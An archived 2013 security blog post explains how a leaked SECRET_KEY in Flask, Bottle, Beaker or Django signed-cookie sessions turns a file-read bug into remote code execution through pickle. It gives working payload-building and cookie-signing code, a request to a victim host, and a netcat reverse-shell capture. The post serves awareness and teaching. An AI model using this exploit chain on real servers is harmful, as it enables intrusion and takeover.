@@ -1,0 +1,598 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
+<head profile="http://gmpg.org/xfn/11">
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<title>Python Web Framework Session Management: from LFR to RCE | Vũ&#039;s Inner Peace</title>
+	<link rel="stylesheet" type="text/css" media="all" href="http://vudang.com/wp-content/themes/zbench/style.css" />
+	<link rel="pingback" href="http://vudang.com/xmlrpc.php" />
+	<link rel="alternate" type="application/rss+xml" title="Vũ&#039;s Inner Peace &raquo; Feed" href="http://vudang.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Vũ&#039;s Inner Peace &raquo; Comments Feed" href="http://vudang.com/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Vũ&#039;s Inner Peace &raquo; Python Web Framework Session Management: from LFR to RCE Comments Feed" href="http://vudang.com/2013/01/python-web-framework-from-lfr-to-rce/feed/" />
+<script type='text/javascript' src='http://vudang.com/wp-includes/js/jquery/jquery.js?ver=1.11.0'></script>
+<script type='text/javascript' src='http://vudang.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://vudang.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://vudang.com/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Runner Up :)' href='http://vudang.com/2012/12/runner-up/' />
+<link rel='next' title='P0wning IE 9 for the first time !!!' href='http://vudang.com/2013/02/p0wning-ie-9-for-the-first-time/' />
+<meta name="generator" content="WordPress 3.9.1" />
+<link rel='canonical' href='http://vudang.com/2013/01/python-web-framework-from-lfr-to-rce/' />
+<link rel='shortlink' href='http://vudang.com/?p=328' />
+
+<link rel="stylesheet" href="http://vudang.com/wp-content/plugins/wp-synhighlight/themes/default/wp-synhighlighter.css" type="text/css" media="screen" />
+
+<script type="text/javascript" src="http://vudang.com/wp-content/plugins/wp-synhighlight/themes/default/wp-synhighlighter.js"></script>
+<style type="text/css" id="syntaxhighlighteranchor"></style>
+</head>
+<body class="single single-post postid-328 single-format-standard">
+<div id="nav">
+	<div id="menus">
+		<ul><li><a href="http://vudang.com/">Home</a></li></ul>
+			</div>
+	<div id="search">
+		<form id="searchform" method="get" action="http://vudang.com/">
+<input type="text" value="Search: type, hit enter" onfocus="if (this.value == 'Search: type, hit enter') {this.value = '';}" onblur="if (this.value == '') {this.value = 'Search: type, hit enter';}" size="35" maxlength="50" name="s" id="s" />
+<input type="submit" id="searchsubmit" value="SEARCH" />
+</form>	</div>
+</div>
+<div id="wrapper">
+	<div id="header">		<h1><a href="http://vudang.com/">Vũ&#039;s Inner Peace</a></h1>
+		<h2></h2>
+		<div class="clear"></div>
+			</div>
+<div id="content">
+		<div class="post-328 post type-post status-publish format-standard hentry category-programming category-tip tag-exploit tag-python post-single" id="post-328"><!-- post div -->
+		<h2 class="title">Python Web Framework Session Management: from LFR to RCE</h2>
+		<div class="post-info-top">
+			<span class="post-info-date">
+				Posted by <a href="http://vudang.com/author/admin/" title="View all posts by Hoàng Vũ" rel="author">Hoàng Vũ</a>
+				on				January 24, 2013							</span>
+						<span class="addcomment"><a href="#respond"  rel="nofollow" title="Leave a comment ?">Leave a comment</a><span class="dsq-postid" rel="328 http://vudang.com/?p=328"> (12)</span></span>
+			<span class="gotocomments"><a href="#comments"  rel="nofollow" title="Go to comments ?">Go to comments</a></span>
+					</div>
+		<div class="clear"></div>
+		<div class="entry">
+			<p><strong>Django, Bottle, Flask, ..</strong> you name it, are python web frameworks that require a SECRET_KEY in their configurable settings. The documents often recommend people to random their own values to use but I hardly find any text describing enough the dangerous when the secret key is guessed or leaked or hacked (local attack or local file read vulnerability in web application). Attacker can use the SECRET_KEY to fake some cookies, csrf token and then find a way to the admin tools .. but that's a lot of work!! <strong>"Simply", he can just use it to execute malicious code :) and I will talk about that in this blog post.</strong></p>
+<p>Remember the old day you found a bug in PHP that can read a arbitrary file in the webserver (<a href="http://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/" target="_blank">not local file inclusion</a>),... it could be frustrated for you to escalate it to a remote code execution (RCE)! You probably audit most of the application source to find other bugs or useful info such as user password or database information. In this aspect, can we say PHP is more secured ?</p>
+<p>When attacking a python web framework, the attacker, knowing your SECRET_KEY from the source code can easily escalate the LFR attack to the RCE, this is at least true in the set of web frameworks that I had examined. The common problem is that they use <strong>pickle</strong> for serializing and unserializing the signed cookie.</p>
+<p><strong><a href="http://flask.pocoo.org/" target="_blank">Flask </a>/ <a href="http://werkzeug.pocoo.org/" target="_blank">Werkzeug</a> </strong><em>( by default, flash use werkzeug session API that's why we have it here. ): </em>Flask implicitly calls session unserialization if the config['SECRET_KEY'] is set to some value and the session_cookie_name (default='session') exists in the cookie, even if there is no session handling code in the web app (<em>how nice, attacker can create a backdoor by adding SECRET_KEY to the config file, and the naive user will just think of it as 'important'</em>).</p>
+<p>The unserialize function from <a href="https://github.com/mitsuhiko/werkzeug/blob/master/werkzeug/contrib/securecookie.py#L229" target="_blank">werkzeug library</a> is called as follows:</p>
+<pre class="brush: python; title: ; notranslate" title="">
+     def unserialize(cls, string, secret_key):
+        if isinstance(string, unicode):
+            string = string.encode('utf-8', 'replace')
+        try:
+            base64_hash, data = string.split('?', 1)
+        except (ValueError, IndexError):
+            items = ()
+        else:
+            items = {}
+            mac = hmac(secret_key, None, cls.hash_method)
+            # -- snip ---
+            try:
+                client_hash = base64_hash.decode('base64')
+            except Exception:
+                items = client_hash = None
+            if items is not None and safe_str_cmp(client_hash, mac.digest()):
+                try:
+                    for key, value in items.iteritems():
+                        items[key] = cls.unquote(value)
+                except UnquoteError:
+                    # -- snip --
+            else:
+                items = ()
+        return cls(items, secret_key, False)
+</pre>
+<p>The unserializer check the signature, then perform<strong style="line-height: 18px;"> unquote() </strong>on cookie value if the signature is correct. unquote() looks very innocent but in fact it is <em><strong>pickle by default</strong></em>.</p>
+<pre class="brush: python; title: ; notranslate" title="">
+    #: the module used for serialization.  Unless overriden by subclasses
+    #: the standard pickle module is used.
+    serialization_method = pickle
+    def unquote(cls, value):
+        # -- snip --
+            if cls.quote_base64:
+                value = value.decode('base64')
+            if cls.serialization_method is not None:
+                value = cls.serialization_method.loads(value)
+            return value
+        # -- snip --
+</pre>
+<p><strong><a href="http://bottlepy.org/" target="_blank">Bottle:</a></strong> There is no real secret key option from the default bottle, but one may want to encode his cookie by using the <a href="http://bottlepy.org/docs/dev/tutorial.html#tutorial-signed-cookies" target="_blank">signed cookie</a> feature. Let's see how the encode work:</p>
+<pre class="brush: python; title: ; notranslate" title="">
+    def get_cookie(self, key, default=None, secret=None):
+        value = self.cookies.get(key)
+        if secret and value:
+            dec = cookie_decode(value, secret) # (key, value) tuple or None
+            return dec[1] if dec and dec[0] == key else default
+        return value or default
+</pre>
+<p>When secret is presented, and there is some value in the cookie, <a href="https://github.com/defnull/bottle/blob/master/bottle.py#L2221" target="_blank">cookie_decode</a> is called:</p>
+<pre class="brush: python; title: ; notranslate" title="">
+def cookie_decode(data, key):
+    data = tob(data)
+    if cookie_is_encoded(data):
+        sig, msg = data.split(tob('?'), 1)
+        if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(key), msg).digest())):
+            return pickle.loads(base64.b64decode(msg))
+    return None
+</pre>
+<p>Again, <strong> <em>pickle is here !</em></strong></p>
+<p><strong><a href="http://beaker.readthedocs.org/" target="_blank">Beaker</a> Session: </strong><em>(any web service can use Beaker as Middle-ware for session, <a href="http://bottlepy.org/docs/dev/recipes.html" target="_blank">bottle is one that recommend</a>)  </em>Beaker.Session has many features and can be confused: ( there are 3 keys: secret_key, validate_key, encrypted_key )</p>
+<ul>
+<li><em>encrypt_key:</em> to encrypt the cookie data and either send back to client (session.type='cookie' / Cookie mode) or store in file (session.type='file' / File mode). If it does not set, the data will not be encrypted !(only base64 encoded). When encrypted_key is presented, the data will be encrypted using a combination of encrypted_key, validate_key(optional) and a random nonce using AES crypto.</li>
+<li><em>validate_key:</em> to sign the cookie when Cookie mode is used and to encrypt the data (as mentioned)</li>
+<li><em>secret:</em> to sign the cookie when File mode is used. (Why don't they just use the validate_key ? I have no idea )</li>
+</ul>
+<p>Of course, when one can read file, he knows all those keys. However, File mode makes it impossible to attack because we have no control on the serialized data i.e. they are stored in local disk. In Cookie mode, it works, even if the cookie is encrypted (since we know how to encrypt lol). You may ask about the random nonce ? luckily, the nonce is part of the session data (!), hence we can fix it with any value we want.</p>
+<p>Here is the code that they use to create the session data ( to send back or store as file):</p>
+<pre class="brush: python; title: ; notranslate" title="">
+    def _encrypt_data(self, session_data=None):
+        &quot;&quot;&quot;Serialize, encipher, and base64 the session dict&quot;&quot;&quot;
+        session_data = session_data or self.copy()
+        if self.encrypt_key:
+            nonce = b64encode(os.urandom(6))[:8]
+            encrypt_key = crypto.generateCryptoKeys(self.encrypt_key,
+                                             self.validate_key + nonce, 1)
+            data = util.pickle.dumps(session_data, 2)
+            return nonce + b64encode(crypto.aesEncrypt(data, encrypt_key))
+        else:
+            data = util.pickle.dumps(session_data, 2)
+            return b64encode(data)
+</pre>
+<p>We clearly see that the data <strong><em>is pickled here</em></strong>.</p>
+<p><strong><a href="https://www.djangoproject.com/" target="_blank">Django</a></strong>: The most well-known and sophisticated web framework in Python. And yes, they did a fairly nice job putting up a<a href="https://docs.djangoproject.com/en/dev/ref/settings/#std:setting-SECRET_KEY" target="_blank"> warning</a>. IMO, it should be marked as 'critical' or 'caution' and in 'red'.</p>
+<p>How does django session work ? We can easily find a comprehensive <a href="http://eli.thegreenplace.net/2011/06/29/django-sessions-part-ii-how-sessions-work/." target="_blank">documentation</a>:  To sum up, django gives 3 settings for sessions: <em>db, file and signed_cookie</em>. Again, we are only interested in signed_cookie because we can easily tamper the data. If SESSION_ENGINE is set to "<strong>django.contrib.sessions.backends.signed_cookies</strong>", we should confirm signed_cookie is used.</p>
+<p>Interestingly, the session data will always be unserialized if we supply a "sessionid" in request cookie. Django also gives a very nice example on <a href="https://github.com/django/django/blob/master/django/core/signing.py" target="_blank">how the cookie is signed in their code</a>. This makes our job even easier.</p>
+<p><strong>Our attack</strong><br />
+We have not discussed about how we attack (some of you may have already known it)! But thanks for the patience ! I write about it lastly since it's the same principle for all cases and very simple (yes! given some knowledge).</p>
+<p>Here again, we can read any file. To find the config file is not that difficult because python app tends to import from here and there. When we obtain the secret key, we can simply implement (or re-use) the cookie signing procedure of that web framework and sign our malicious code. Because they use pickle.loads() when unserializing, our malicious payload should be the result of pickle.dumps().</p>
+<p>pickle.dumps() and loads() is often safe when playing with data such as string, integer, array, hash, dict... <a href="http://blog.nelhage.com/2011/03/exploiting-pickle/" target="_blank">But not when it was used on a certain special crafted object</a> ! In fact, one can execute any python code he wants. I write a nice piece of code to convert a working python code to pickle payload. We shall read the code from connback.py (which is a "connect back" shell) and pickle it. If one execute <strong>pickle.loads(payload)</strong> our connect back shell will be executed.</p>
+<pre class="brush: python; title: ; notranslate" title="">
+code = b64(open('connback.py').read())
+class ex(object):
+    def __reduce__(self):
+        return ( eval, ('str(eval(compile(&quot;%s&quot;.decode(&quot;base64&quot;),&quot;q&quot;,&quot;exec&quot;))).strip(&quot;None&quot;)'%(code),) )
+payload = pickle.dumps(ex())
+</pre>
+<p>Now sign (for flask web app):</p>
+<pre class="brush: python; title: ; notranslate" title="">
+def send_flask(key, payload):
+    data = 'id='+b64(payload)
+    mac = b64(hmac(key, '|'+data, hashlib.sha1).digest())
+    s = '%(sig)s?%(data)s' % {'sig':mac, 'data':data}
+</pre>
+<p>and send it</p>
+<pre class="brush: python; title: ; notranslate" title="">
+print requests.get('http://victim/', cookies={'session':s})
+</pre>
+<p>In another console:</p>
+<pre class="brush: python; title: ; notranslate" title="">
+danghvu@thebeast:~$ nc -lvvv 1337
+Connection from x.x.x.x port 1337 [tcp/*] accepted
+!P0Wn! Congratulation !!
+sh: no job control in this shell
+sh-4.1$
+</pre>
+<p><strong>What else ?</strong><br />
+- So what ? I am safe as long as my secret key is safe ! OK, good for you... but that's like saying, "I leave my key on the roof because I know you can't climb there..."<br />
+- OK, so If I do not use this type of session cookie, I will be safe ! This is true, for small app it's much nicer to put the session data in file (in database also a risk if one can tamper it, <a href="http://sqlmap.org/" target="_blank">heard about sql injection</a> ?). But for bigger app with distributed storage, this may violate the "<a href="http://en.wikipedia.org/wiki/Shared_nothing_architecture" target="_blank">shared nothing architecture</a>" or reduce the performance.<br />
+- Then how ? Maybe ask the framework not to use pickle but use a different type of serialization that doesn't allow code execution ? I don't know if one exists, but it is nice if it does. PHP is again more secure? their unserialize() and serialize() does not have this problem. <a href="http://heine.familiedeelstra.com/security/unserialize" target="_blank"> (oh wait..)</a></p>
+<p><em>Last thing:</em><br />
+WebPy: I check <a href="http://webpy.org/sessions/" target="_blank">their web for session</a>, and this is what I found:<br />
+<strong>CookieHandler - DANGEROUS, UNSECURE, EXPERIMENTAL</strong></p>
+<p>So good job :D, maybe everyone should do this as well. I do not try further, maybe you can try with webpy and others ;).</p>
+<p><a href="https://github.com/danghvu/pwp" target="_blank">Here is what I did, PoC only, so make some effort if you want it to work for you ;)</a><br />
+<del>As a gift, <a href="http://ex.wargame.vn:5000/" target="_blank">this web app is a vulnerable one</a>, let's see if you can find the lfr bug and escalate it to rce, then you will find your real gift, the flag :).</del></p>
+<p><strong>Update: </strong>The source code for the vulnerable web app is now included in <a href="https://github.com/danghvu/pwp/tree/master/vuln_app">github</a>, the secret key is not the same as what is running though.</p>
+<p><strong>Update: </strong>List of people who have found my "gift": <a href="https://twitter.com/moritz_schlarb" target="_blank">moritz_schlarb</a>, <a href="http://www.reddit.com/user/executex" target="_blank">executex</a> <em>( server is off for security reason :) )</em><br />
+<del><em>(If you want your name here, please comment with a proof that you have got it)</em></del></p>
+					</div><!-- END entry -->
+		<div class="add-info">
+					</div>
+		<div class="post-info-bottom">
+			<span class="post-info-category"><a href="http://vudang.com/category/programming/" title="View all posts in Programming" rel="category tag">Programming</a>, <a href="http://vudang.com/category/tip/" title="View all posts in Tips" rel="category tag">Tips</a></span><span class="post-info-tags"><a href="http://vudang.com/tag/exploit/" rel="tag">exploit</a>, <a href="http://vudang.com/tag/python/" rel="tag">python</a></span>
+		</div>
+		<div id="nav-below">
+			<div class="nav-previous"><a href="http://vudang.com/2012/12/runner-up/" rel="prev"><span class="meta-nav">&larr;</span> Runner Up :)</a></div>
+			<div class="nav-next"><a href="http://vudang.com/2013/02/p0wning-ie-9-for-the-first-time/" rel="next">P0wning IE 9 for the first time !!! <span class="meta-nav">&rarr;</span></a></div>
+		</div><!-- #nav-below -->					
+	</div><!-- END post -->
+	
+<div id="disqus_thread">
+                    <div id="dsq-content">
+
+
+            <ul id="dsq-comments">
+                    <li class="comment even thread-even depth-1" id="dsq-comment-6">
+        <div id="dsq-comment-header-6" class="dsq-comment-header">
+            <cite id="dsq-cite-6">
+                <span id="dsq-author-user-6">Andrew Azarov</span>
+            </cite>
+        </div>
+        <div id="dsq-comment-body-6" class="dsq-comment-body">
+            <div id="dsq-comment-message-6" class="dsq-comment-message"><p>Wow wow...<br />
+Did not know they would do something like this (I mean pickle).<br />
+Hopefully I'm using my own session manager for bottle.</p>
+</div>
+        </div>
+
+    <ul class="children">
+    <li class="comment odd alt depth-2" id="dsq-comment-7">
+        <div id="dsq-comment-header-7" class="dsq-comment-header">
+            <cite id="dsq-cite-7">
+                <span id="dsq-author-user-7">danghvu</span>
+            </cite>
+        </div>
+        <div id="dsq-comment-body-7" class="dsq-comment-body">
+            <div id="dsq-comment-message-7" class="dsq-comment-message"><p>Thanks for commenting. Yes, once you have a security breached such that your configuration file is leaked, it is potential that your system will be compromised sooner or later. The purpose of my post is to raise awareness that this outbreak can easily damage to the level that giving attacker a shell without much hassle.<br />
+Furthermore, many server does not allow a remote access to the database. With a shell, likely in the privilege of the vulnerable web app, the attacker can access to both file and database, tamper it whatever way he wants, or even run some kernel rootkit to escalate to root, that's imo very serious.</p>
+</div>
+        </div>
+
+    </li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+    <li class="comment even thread-odd thread-alt depth-1" id="dsq-comment-8">
+        <div id="dsq-comment-header-8" class="dsq-comment-header">
+            <cite id="dsq-cite-8">
+                <span id="dsq-author-user-8">Brenton</span>
+            </cite>
+        </div>
+        <div id="dsq-comment-body-8" class="dsq-comment-body">
+            <div id="dsq-comment-message-8" class="dsq-comment-message"><p>I believe Flask recommends you use a JSON-based engine for this reason.  There's even an example in the docs.  (Don't remember offhand if it's in Flask or Flask-login.)</p>
+<p>For such a vulnerability, they should probably switch the default and throw a warning so people realize there's a change.</p>
+</div>
+        </div>
+
+    <ul class="children">
+    <li class="comment odd alt depth-2" id="dsq-comment-9">
+        <div id="dsq-comment-header-9" class="dsq-comment-header">
+            <cite id="dsq-cite-9">
+                <span id="dsq-author-user-9">Brenton</span>
+            </cite>
+        </div>
+        <div id="dsq-comment-body-9" class="dsq-comment-body">
+            <div id="dsq-comment-message-9" class="dsq-comment-message"><p>Flask's creator tried to change the default to JSON months back but ran into backwards compatibility issues.  He mentions it on the red dit comments for this article.</p>
+</div>
+        </div>
+
+    <ul class="children">
+    <li class="comment even depth-3" id="dsq-comment-12">
+        <div id="dsq-comment-header-12" class="dsq-comment-header">
+            <cite id="dsq-cite-12">
+                <span id="dsq-author-user-12">danghvu</span>
+            </cite>
+        </div>
+        <div id="dsq-comment-body-12" class="dsq-comment-body">
+            <div id="dsq-comment-message-12" class="dsq-comment-message"><p>Thanks for the info, someone published my blog in Reddit, thankfully it generates a nice discussion there: <a href="http://www.reddit.com/r/Python/comments/17c6to/exploiting_secure_cookies_in_popular_python_web/" rel="nofollow">http://www.reddit.com/r/Python/comments/17c6to/exploiting_secure_cookies_in_popular_python_web/</a></p>
+</div>
+        </div>
+
+    <ul class="children">
+    <li class="comment odd alt depth-4" id="dsq-comment-14">
+        <div id="dsq-comment-header-14" class="dsq-comment-header">
+            <cite id="dsq-cite-14">
+                <span id="dsq-author-user-14">executex_from_reddit</span>
+            </cite>
+        </div>
+        <div id="dsq-comment-body-14" class="dsq-comment-body">
+            <div id="dsq-comment-message-14" class="dsq-comment-message"><p>Yes and the creator of Flask replied in one of the comments.</p>
+</div>
+        </div>
+
+    </li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+    <li class="comment even thread-even depth-1" id="dsq-comment-10">
+        <div id="dsq-comment-header-10" class="dsq-comment-header">
+            <cite id="dsq-cite-10">
+                <span id="dsq-author-user-10">executex_from_reddit</span>
+            </cite>
+        </div>
+        <div id="dsq-comment-body-10" class="dsq-comment-body">
+            <div id="dsq-comment-message-10" class="dsq-comment-message"><p>What does this mean that my secret is not here? Thanks for the fun.</p>
+</div>
+        </div>
+
+    <ul class="children">
+    <li class="comment odd alt depth-2" id="dsq-comment-11">
+        <div id="dsq-comment-header-11" class="dsq-comment-header">
+            <cite id="dsq-cite-11">
+                <span id="dsq-author-user-11">danghvu</span>
+            </cite>
+        </div>
+        <div id="dsq-comment-body-11" class="dsq-comment-body">
+            <div id="dsq-comment-message-11" class="dsq-comment-message"><p>It means the secret is not the SECRET_KEY ;], it's somewhere in the server ! Glad that you enjoy it</p>
+</div>
+        </div>
+
+    <ul class="children">
+    <li class="comment even depth-3" id="dsq-comment-13">
+        <div id="dsq-comment-header-13" class="dsq-comment-header">
+            <cite id="dsq-cite-13">
+                <span id="dsq-author-user-13">executex_from_reddit</span>
+            </cite>
+        </div>
+        <div id="dsq-comment-body-13" class="dsq-comment-body">
+            <div id="dsq-comment-message-13" class="dsq-comment-message"><p>Any chance you can write some comments to explain the section of your code? os.dup2(sok.fileno(),0) etc. </p>
+</div>
+        </div>
+
+    <ul class="children">
+    <li class="comment odd alt depth-4" id="dsq-comment-15">
+        <div id="dsq-comment-header-15" class="dsq-comment-header">
+            <cite id="dsq-cite-15">
+                <span id="dsq-author-user-15">danghvu</span>
+            </cite>
+        </div>
+        <div id="dsq-comment-body-15" class="dsq-comment-body">
+            <div id="dsq-comment-message-15" class="dsq-comment-message"><p>well, it's not related to this vulnerability. 'connback.py' is just an example of code that you can execute on the victim server. The connback.py is a 'connect back shell' or a 'reversed shell', you may search for that keyword to know more. Basically it shall connect to a server via socket, pipe anything it receive from the socket to /bin/sh and also pipe everything that /bin/sh return ( to stdout, stderr ) back to the socket. os.dup2 is to help the 'pipe' thing.</p>
+</div>
+        </div>
+
+    </li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+    <li class="comment even thread-odd thread-alt depth-1" id="dsq-comment-17">
+        <div id="dsq-comment-header-17" class="dsq-comment-header">
+            <cite id="dsq-cite-17">
+                <span id="dsq-author-user-17">Osman Masood</span>
+            </cite>
+        </div>
+        <div id="dsq-comment-body-17" class="dsq-comment-body">
+            <div id="dsq-comment-message-17" class="dsq-comment-message"><p>Yo, what do u think about web2py?</p>
+</div>
+        </div>
+
+    <ul class="children">
+    <li class="comment odd alt depth-2" id="dsq-comment-18">
+        <div id="dsq-comment-header-18" class="dsq-comment-header">
+            <cite id="dsq-cite-18">
+http://vudang.com/                <span id="dsq-author-user-18">w~</span>
+            </cite>
+        </div>
+        <div id="dsq-comment-body-18" class="dsq-comment-body">
+            <div id="dsq-comment-message-18" class="dsq-comment-message"><p>Hi, just did a quick check for web2py. It uses pickle too, however the default mode is file-based cookie :). They call it "secure_loads" and "secure_dumps" <a href="https://github.com/web2py/web2py/blob/master/gluon/utils.py#L140" rel="nofollow">https://github.com/web2py/web2py/blob/master/gluon/utils.py#L140</a></p>
+</div>
+        </div>
+
+    </li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+            </ul>
+
+
+        </div>
+
+    </div>
+
+<script type="text/javascript">
+/* <![CDATA[ */
+    var disqus_url = 'http://vudang.com/2013/01/python-web-framework-from-lfr-to-rce/';
+    var disqus_identifier = '328 http://vudang.com/?p=328';
+    var disqus_container_id = 'disqus_thread';
+    var disqus_domain = 'disqus.com';
+    var disqus_shortname = 'vudang';
+    var disqus_title = "Python Web Framework Session Management: from LFR to RCE";
+        var disqus_config = function () {
+        var config = this; // Access to the config object
+        config.language = '';
+
+        /*
+           All currently supported events:
+            * preData — fires just before we request for initial data
+            * preInit - fires after we get initial data but before we load any dependencies
+            * onInit  - fires when all dependencies are resolved but before dtpl template is rendered
+            * afterRender - fires when template is rendered but before we show it
+            * onReady - everything is done
+         */
+
+        config.callbacks.preData.push(function() {
+            // clear out the container (its filled for SEO/legacy purposes)
+            document.getElementById(disqus_container_id).innerHTML = '';
+        });
+                config.callbacks.onReady.push(function() {
+            // sync comments in the background so we don't block the page
+            var script = document.createElement('script');
+            script.async = true;
+            script.src = '?cf_action=sync_comments&post_id=328';
+
+            var firstScript = document.getElementsByTagName( "script" )[0];
+            firstScript.parentNode.insertBefore(script, firstScript);
+        });
+                    };
+/* ]]> */
+</script>
+
+<script type="text/javascript">
+/* <![CDATA[ */
+    var DsqLocal = {
+        'trackbacks': [
+        ],
+        'trackback_url': "http:\/\/vudang.com\/2013\/01\/python-web-framework-from-lfr-to-rce\/trackback\/"    };
+/* ]]> */
+</script>
+
+<script type="text/javascript">
+/* <![CDATA[ */
+(function() {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.' + 'disqus.com' + '/embed.js?pname=wordpress&pver=2.74';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+/* ]]> */
+</script>
+</div><!--content-->
+<div id="sidebar-border">
+	<div id="rss_border">
+		<div class="rss_border">
+			<div id="rss_wrap">
+				<div class="rss_wrap">
+										<a class="rss rss_text" href="http://vudang.com/feed/" rel="bookmark" title="RSS Feed">RSS Feed</a>
+																													</div>
+			</div>
+		</div>
+	</div>
+	<div id="sidebar">
+
+<div id="text-2" class="widget widget_text"><h3 class="widgettitle">About Me</h3>			<div class="textwidget">I am Vũ, a daily developer and a want-to-be computer scientist. I "hack" different things and this blog records my journey.</div>
+		</div><div id="text-3" class="widget widget_text"><h3 class="widgettitle">Vu&#8217;s HP</h3>			<div class="textwidget">		<div align=left>
+        	<span id='dead'> </span> s
+		</div>
+	
+<script type="text/javascript">
+<!--
+	var mybd = new Date(1988, 2, 12);
+	var myed = new Date(2088, 2, 12);
+
+function updateLive(){
+	var current = new Date();
+	diff = myed-current;
+	document.getElementById('dead').innerHTML = (diff/1000).toFixed(2);
+
+	setTimeout(updateLive,50);
+}
+updateLive();
+//-->
+</script></div>
+		</div><div id="linkcat-2" class="widget widget_links"><h3 class="widgettitle">My activities</h3>
+	<ul class='xoxo blogroll'>
+<li><a href="http://github.com/danghvu" target="_blank">Github</a></li>
+<li><a href="http://ex.wargame.vn:8080/" title="Set of web security challenges">Try my games</a></li>
+<li><a href="https://twitter.com/wind4k" target="_blank">Twitter</a></li>
+
+	</ul>
+</div>
+		<div id="recent-posts-2" class="widget widget_recent_entries">		<h3 class="widgettitle">Recent Posts</h3>		<ul>
+					<li>
+				<a href="http://vudang.com/2013/12/update-before-the-year-end/">Update before the year end</a>
+						</li>
+					<li>
+				<a href="http://vudang.com/2013/07/whatsapp-vuln/">Token of Appreciation from Whatsapp</a>
+						</li>
+					<li>
+				<a href="http://vudang.com/2013/06/defcon-21-12/">DEFCON 21 # 12</a>
+						</li>
+					<li>
+				<a href="http://vudang.com/2013/05/analysis-of-nginx-1-3-91-4-0-stack-buffer-overflow-and-x64-exploitation-cve-2013-2028/">Analysis of nginx 1.3.9/1.4.0 stack buffer overflow and x64 exploitation (CVE-2013-2028)</a>
+						</li>
+					<li>
+				<a href="http://vudang.com/2013/03/math-are-always-useful/">Math is always useful (or write up of Nullcom prog400)</a>
+						</li>
+				</ul>
+		</div><div id="text-4" class="widget widget_text"><h3 class="widgettitle">Google Reader</h3>			<div class="textwidget"><script type="text/javascript" src="http://www.google.com/reader/ui/publisher-en.js"></script>
+<script type="text/javascript" src="http://www.google.com/reader/public/javascript/user/17107794851599602212/label/Security Blogs?n=5&callback=GRC_p(%7Bc%3A%22gray%22%2Ct%3A%22Security%20Blogs%22%2Cs%3A%22false%22%2Cn%3A%22true%22%2Cb%3A%22false%22%7D)%3Bnew%20GRC"></script>
+<script type="text/javascript" src="http://www.google.com/reader/ui/publisher-en.js"></script>
+<script type="text/javascript" src="http://www.google.com/reader/public/javascript/user/17107794851599602212/label/Algorithms?n=5&callback=GRC_p(%7Bc%3A%22gray%22%2Ct%3A%22Algorithms%22%2Cs%3A%22false%22%2Cn%3A%22true%22%2Cb%3A%22false%22%7D)%3Bnew%20GRC"></script></div>
+		</div><div id="archives-2" class="widget widget_archive"><h3 class="widgettitle">Archives</h3>		<ul>
+	<li><a href='http://vudang.com/2013/12/'>December 2013</a></li>
+	<li><a href='http://vudang.com/2013/07/'>July 2013</a></li>
+	<li><a href='http://vudang.com/2013/06/'>June 2013</a></li>
+	<li><a href='http://vudang.com/2013/05/'>May 2013</a></li>
+	<li><a href='http://vudang.com/2013/03/'>March 2013</a></li>
+	<li><a href='http://vudang.com/2013/02/'>February 2013</a></li>
+	<li><a href='http://vudang.com/2013/01/'>January 2013</a></li>
+	<li><a href='http://vudang.com/2012/12/'>December 2012</a></li>
+	<li><a href='http://vudang.com/2012/10/'>October 2012</a></li>
+	<li><a href='http://vudang.com/2012/09/'>September 2012</a></li>
+	<li><a href='http://vudang.com/2012/08/'>August 2012</a></li>
+	<li><a href='http://vudang.com/2012/07/'>July 2012</a></li>
+	<li><a href='http://vudang.com/2012/05/'>May 2012</a></li>
+	<li><a href='http://vudang.com/2012/03/'>March 2012</a></li>
+	<li><a href='http://vudang.com/2012/02/'>February 2012</a></li>
+	<li><a href='http://vudang.com/2012/01/'>January 2012</a></li>
+	<li><a href='http://vudang.com/2011/12/'>December 2011</a></li>
+	<li><a href='http://vudang.com/2011/07/'>July 2011</a></li>
+	<li><a href='http://vudang.com/2011/06/'>June 2011</a></li>
+	<li><a href='http://vudang.com/2011/05/'>May 2011</a></li>
+	<li><a href='http://vudang.com/2010/01/'>January 2010</a></li>
+	<li><a href='http://vudang.com/2009/12/'>December 2009</a></li>
+	<li><a href='http://vudang.com/2009/01/'>January 2009</a></li>
+	<li><a href='http://vudang.com/2008/12/'>December 2008</a></li>
+		</ul>
+</div><div id="categories-2" class="widget widget_categories"><h3 class="widgettitle">Categories</h3>		<ul>
+	<li class="cat-item cat-item-23"><a href="http://vudang.com/category/all-thing-around/" title="View all posts filed under All Thing Around">All Thing Around</a>
+</li>
+	<li class="cat-item cat-item-38"><a href="http://vudang.com/category/hack/" title="View all posts filed under Hack">Hack</a>
+</li>
+	<li class="cat-item cat-item-20"><a href="http://vudang.com/category/programming/" title="View all posts filed under Programming">Programming</a>
+</li>
+	<li class="cat-item cat-item-22"><a href="http://vudang.com/category/tip/" title="View all posts filed under Tips">Tips</a>
+</li>
+	<li class="cat-item cat-item-21"><a href="http://vudang.com/category/vietnam/" title="View all posts filed under Vietnam">Vietnam</a>
+</li>
+		</ul>
+</div><div id="meta-2" class="widget widget_meta"><h3 class="widgettitle">Meta</h3>			<ul>
+						<li><a href="http://vudang.com/wp-login.php">Log in</a></li>
